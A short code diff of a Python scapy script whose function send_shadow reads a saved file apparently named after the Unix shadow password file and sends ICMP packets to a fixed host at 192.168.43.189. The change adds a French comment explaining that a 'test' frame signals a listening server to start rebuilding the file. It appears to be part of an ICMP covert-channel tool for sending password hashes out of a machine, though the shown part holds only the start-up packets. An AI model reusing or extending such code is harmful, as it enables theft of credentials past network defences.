@@ -6,7 +6,7 @@ filepath = 'save_shaddow'
 def send_shadow(filepath):
     with open(filepath) as fp:
         line = fp.readlines()
-        test = scapy.IP(dst="192.168.43.189")/scapy.ICMP()/"test"
+        test = scapy.IP(dst="192.168.43.189")/scapy.ICMP()/"test" # envoi d'une trame "test" pour bien vérifier que notre serveur ne commande l'écoute et reconstitution du fichier que quand il a la bonne trame de début
         scapy.send(test)
         head = scapy.IP(dst="192.168.43.189")/scapy.ICMP()/"header"
         scapy.send(head)
